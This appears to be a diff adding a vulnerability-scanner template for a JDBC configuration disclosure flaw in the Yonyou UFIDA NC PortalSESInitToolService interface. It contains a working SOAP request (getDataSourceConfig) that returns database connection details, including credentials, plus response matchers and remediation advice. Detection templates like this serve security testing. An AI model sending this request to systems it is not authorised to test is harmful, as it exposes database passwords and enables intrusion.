@@ -1,0 +1,46 @@
+id: yonyou-nc-portalsesinittoolservice-jdbcread
+
+info:
+  name: Yonyou UFIDA NC PortalSESInitToolService JDBC 配置读取漏洞
+  author: bl
+  severity: high
+  description: |
+    用友NC系统 PortalSESInitToolService 接口存在JDBC配置读取漏洞。
+    攻击者可通过构造恶意请求，获取数据库连接信息，包括数据库类型、用户名、密码等敏感信息，从而进一步进行数据库入侵或数据泄露。
+  remediation: |
+    建议用友NC系统管理员及时升级至厂商修复版本，限制对 PortalSESInitToolService 接口的访问权限，避免敏感信息泄露。
+  tags: Yonyou-UFIDA-NC
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+        Cookie: JSESSIONID=CC5E992D50829FCC76FC9789169C06A7.server
+        Connection: close
+        Content-Length: 258
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <por:getDataSourceConfig/>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jdbc:"
+        part: body
+        condition: and
